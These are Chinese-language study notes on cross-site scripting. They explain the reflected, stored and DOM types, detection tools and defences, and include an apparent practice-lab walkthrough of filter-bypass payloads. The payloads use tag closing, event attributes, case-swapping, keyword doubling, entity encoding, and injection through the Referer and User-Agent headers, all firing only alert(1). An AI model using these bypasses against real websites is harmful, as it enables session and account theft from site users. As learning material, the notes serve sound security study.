# 原理

跨站脚本攻击是指恶意攻击者**往Web页面里插入恶意Script代码**，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。

当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。**所以**，**当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。**

# 产生条件/原因

形成XSS漏洞的主要原因是**程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。**

# 危害

- **盗取**各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
- 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
- 盗窃企业重要的具有商业价值的资料
- 非法转账
- 强制发送电子邮件
- 网站挂马
- 控制受害者机器向其它网站发起攻击

# 分类

## 反射型XSS

攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。

`提交 x=xiaodi => x.php => 回包`

反射型 XSS漏洞常见于通过 URL 传递参数的功能，如**网站搜索、跳转**等。

反射型XSS只是简单的把用户输入的数据“反射”给浏览器，也就是说需要诱使用户“点击”一个恶意链接，才能攻击成功。漏洞产生的原因是攻击者注入的数据反映在响应中。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。

### 反射型 XSS 的攻击步骤

已知存在XSS漏洞

#### 1. 攻击者构造出包含恶意代码的 URL，通过各种办法发送给终端用户（**钓鱼**）。

如：构造url为：`http://192.168.1.101/submit.php?input_value=“><img src=1 onerror=alert(/xss/)/>`

#### 2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。

用户访问上述URL触发XSS漏洞，GET方式提交了上述代码，后端处理之后返回前端

#### 3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

## 存储型XSS

代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。

`提交 x=xiaodi => x.php => 写到数据库某个表 => x.php =>回显`

存储型 XSS攻击常见于带有用户保存数据的网站功能，如**论坛发帖、商品评论、用户私信**等。

储存型XSS会把用户输入的数据“储存”在服务器端。这种XSS具有很强的稳定性。持久的XSS危害性大，容易造成蠕虫，因为每当用户打开页面，查看内容时脚本将自动执行。持久型XSS最大的危害在于可能在一个系统中的用户间互相感染，以致整个系统的用户沦陷。能够造成这种危害的脚本我们称之为XSS蠕虫。

### 存储型 XSS 的攻击步骤

已知存在XSS漏洞

#### 1. 攻击者将恶意代码提交到目标网站的数据库中。

如：留言板提交XSS攻击脚本，并存储到数据库中

#### 2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。

#### 3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

## DOM型XSS——完全在前端

基于文档对象模型(Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如URI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。

`提交 x=xiaodi => 本地浏览器静态前端代码 =>x.php`

DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，所以防范DOM型XSS完全就是前端的责任,必须注意!!!。

### DOM 型 XSS 的攻击步骤

已知存在XSS漏洞

#### 1. 攻击者构造出特殊的 URL，其中包含恶意代码。

#### 2. 用户打开带有恶意代码的 URL。

#### 3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。

# 检测

## 检测方式

XSS扫描工具：XSpear

## 检测位置

文章发表、评论、留言、注册资料的地方、修改资料的地方等

# 利用

### 利用目的

- **盗取**各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号——Cookie

### 利用方式

#### 在线XSS平台

各类在线XSS平台，为避免后门，建议自己搭建XSS平台

#### 工具

- Kali下的BeEF-Xss漏洞利用框架

- 自动化XSS工具——XSStrike

#### 常用绕过过滤代码

##### Level-2——普通闭合

目的语句：

```html
<input name=keyword  value=""><script>alert(1)</script>">
```

提交payload

```html
"><script>alert(1)</script>
```

##### Level-3——过滤尖括号——onclick事件属性

原始input标签

```html
<input name=keyword  value='111111'>	
```

目的input标签(注意value属性的前半个单引号和后半个单引号的闭合)

```html
<input name=keyword  value='11111' onclick='alert(1)'>	
```

我们提交的XSS语句就成为：

```html
11111' onclick='alert(1)
```

因而可以绕过对于提交内容中的尖括号的过滤

##### Level-5——过滤`<script`和 `on`字符——超链接

既要闭合input标签内部，又要使得链接标签写入前端写法如下

原始input标签

```html
<input name=keyword  value="3333 ">
```

闭合inoput并构造添加一个超链接标签(注意前后双引号闭合)

```html
<input name=keyword  value="3333"><a href="javascript:alert(1);">链接文本</a><"">
```

则需要提交到搜索框中的部分为

```html
3333"><a href="javascript:alert(1);">链接文本</a><"
```

提交后XSS执行成功

##### Level-6——`<script`、`on`、`src`、`href`关键字都会被过滤——大小写绕过过滤

`str_replace()` 函数以其他字符替换字符串中的一些字符（区分大小写）。

由于区分大小写，这时我们尝试将提交XSS语句中涉及过滤关键字的部分大小写绕过(这里只是单纯过滤关键字，没有使用正则表达式匹配，如果使用了正则匹配，则无法大小写绕过过滤)，则XSS语句写成

```
3333"><a Href="javascript:alert(1);">链接文本</a><"
```

提交后执行成功

##### Level-7——`<script`、`on`、`src`、`href`关键字都会被过滤且大小写无法绕过——关键字双写绕过

我们看到过滤代码只进行一次过滤，而非递归或循环过滤，因此我们将涉及的过滤关键字再写一遍插入到原关键字中，使得过滤时触发关键字被替换为空，过滤后又拼组成关键字并带到前端。则XSS语句为

```
3333"><a hrhrefef="javascscriptript:alert(1);">链接文本</a><"
```

提交后执行成功

##### Level-8——关键字、大小写、双写无法绕过——Unicode编码绕过

基于以上的过滤手法，我们想到编码绕过思路

在超级加解密工具中选择编码方式为

![202203061013324](https://img.yatjay.top/md/202203261113755.png)

对提交内容进行编码后在提交，`javascript:alert(1);`的编码结果如下：

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#59;
```

提交后点击友情链接，成功触发XSS代码

##### Level-9——关键字、大小写、双写无法绕过+检查`http://`

绕过思路

- 编码绕过关键字过滤
- 添加`//http://`，满足提交参数包含`http://`，js语句执行时`//`后的语句注释掉，以避免影响js语句执行

则XSS代码如下，即在上一关的`javascript:alert(1);`编码之后添加`//http://`

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#59;//http://
```

提交后添加友情链接，成功触发XSS语句

##### Level-10——关键字、大小写、双写无法绕过+表单`type=“hidden”`属性——

我们设法使得表单里的input标签出现onclick鼠标触发事件属性，并且由于需要鼠标点击，那么type属性也不能为hidden，当`input`标签中同时出现`type=“hidden”`和`type=“text”`两种属性时，会执行后者，因此可以添加`type=“text”`属性到`input`标签中去

原始input标签如下

```html
<input name="t_sort"  value="888" type="hidden">
```

目的input标签如下

```html
<input name="t_sort"  value="888" onclick="alert(1)" type="text" type="hidden">
```

则XSS语句如下(GET参数提交)

```html
?keyword=2222&t_sort=888" onclick="alert(1)" type="text
```

提交后点击输入框，成功触发XSS语句

##### Level-11——$_SERVER['HTTP_REFERER']参数提交拼接

`$_SERVER['HTTP_REFERER'];`提交的这个参数才会输出到一个`type="hidden"`的input标签中，且参数值不能出现尖括号

绕过思路和上一关一样，但是提交参数的位置不是GET方式，而是`$_SERVER['HTTP_REFERER'];`，因此抓包后修改数据包，在HTTP头部中的Referer属性中提交XSS语句payload

原始input标签如下

```html
<input name="t_ref"  value="" type="hidden">
```

目的input标签如下

```html
<input name="t_ref"  value="" onclick="alert(1)" type="text" type="hidden">
```

则XSS语句如下(数据包中HTTP头部属性Referer中提交)

```html
" onclick="alert(1)" type="text
```

抓包修改或添加Refer属性

![202203061139372](https://img.yatjay.top/md/202203261113897.png)

点击输入框，成功触发XSS语句

##### Level-12——$_SERVER['HTTP_USER_AGENT']参数提交拼接

设法修改数据包中的`User-Agent`信息，使之传递XSS语句即可

抓包后将上一关的payload添加到数据包的`User-Agent`处即

```
User-Agent: " onclick="alert(1)" type="text
```

![202203061317972](https://img.yatjay.top/md/202203261113054.png)

提交后点击输入框，成功触发XSS语句

# 修复与防御方案

- 开启HttpOnly

- 输入过滤：对前端提交来的参数进行过滤，比如不接收`<script>`

- 输出过滤：后端处理后，对输出到前端的内容进行过滤，比如不输出`<script>`

- PHP、Java的XSS防护方案参考文章

  - PHP:http://www.zuimoge.com/212.html

  - JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html